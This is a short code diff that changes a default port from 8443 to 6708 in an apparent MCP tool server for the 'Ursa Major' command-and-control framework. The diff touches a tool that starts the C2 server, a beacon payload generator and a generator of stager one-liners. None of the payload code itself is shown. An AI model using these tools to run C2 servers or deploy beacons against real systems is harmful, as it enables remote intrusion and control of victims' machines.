@@ -168,12 +168,12 @@ def _time_ago(ts):
 
 
 @mcp_server.tool()
-def ursa_start_c2(port: int = 8443, host: str = "0.0.0.0") -> str:
+def ursa_start_c2(port: int = 6708, host: str = "0.0.0.0") -> str:
     """
     Start the Ursa Major C2 server as a background daemon.
 
     Args:
-        port: Port to listen on (default 8443)
+        port: Port to listen on (default 6708)
         host: Bind address (default 0.0.0.0)
     """
     # Check if already running
@@ -2133,7 +2133,7 @@ def ursa_generate(
     Generate a beacon payload configured for your C2 server.
 
     Args:
-        c2_url: The C2 server URL (e.g., http://10.0.0.1:8443).
+        c2_url: The C2 server URL (e.g., http://10.0.0.1:6708).
                 Auto-detects if not provided.
         interval: Beacon interval in seconds (default 5)
         jitter: Jitter factor 0.0-1.0 (default 0.3 = ±30%)
@@ -2230,7 +2230,7 @@ def ursa_stager(c2_url: str | None = None) -> str:
             _sock.close()
         except Exception:
             local_ip = "YOUR_IP"
-        c2_url = f"http://{local_ip}:8443"
+        c2_url = f"http://{local_ip}:6708"
 
     lines = [
         f"URSA STAGER ONE-LINERS → {c2_url}",
